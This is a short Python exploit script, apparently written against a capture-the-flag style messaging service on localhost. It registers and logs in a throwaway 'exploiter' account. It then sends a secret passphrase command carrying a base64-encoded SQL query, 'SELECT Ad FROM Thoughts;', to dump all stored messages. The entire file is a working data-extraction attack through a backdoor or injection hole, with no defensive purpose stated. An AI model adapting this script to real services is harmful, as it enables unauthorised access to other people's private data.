import socket
import random

host = '127.0.0.1'
port = 2340

class CheckSock:
    def __init__(self, host, port, timeout = 5):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = host
        self.port = port
        self.socket.settimeout(timeout)
        
    def __enter__(self):
        self.s = self.socket.connect((self.host, self.port))
        self._recv()
        return self

    def __exit__(self, type, value, traceback):
        self.socket.close()

    def _send(self, message):
        self.socket.sendall((message + '\n').encode())
        
    def _recv(self):
        return self.socket.recv(1024).decode().strip()
    
    def register(self, username, password):
        self._send('1')  # Choose register
        self._recv()     # Username prompt
        self._send(username)
        self._recv()     # Password prompt
        self._send(password)
        return self._recv()
    
    def login(self, username, password):
        self._send('2')  # Choose login
        self._recv()     # Username prompt
        self._send(username)
        self._recv()     # Password prompt
        self._send(password)
        return self._recv()
    
    def get_all_messages(self):
        #SELECT Ad FROM Thoughts;
        self._send('impulseall Pedo mellon a minno U0VMRUNUIEFkIEZST00gVGhvdWdodHM7!')
        response = self._recv()
        return response
    

def recv(s):
    return s.recv(1024).decode().strip()


test_username = f'exploiter_{random.randint(10000,1000000)}'
test_password = f'exploiter_pass'

with CheckSock(host, port) as s:
    reg_result = s.register(test_username, test_password)
if not reg_result.startswith("Registration successful!"):
    print("service has problems")
    exit(1)
with CheckSock(host, port) as s:
    login_result = s.login(test_username, test_password)
    if not login_result.startswith("Login successful!"):
        print("service has problems")
        exit(1)
    getall_result = s.get_all_messages()
    print(getall_result)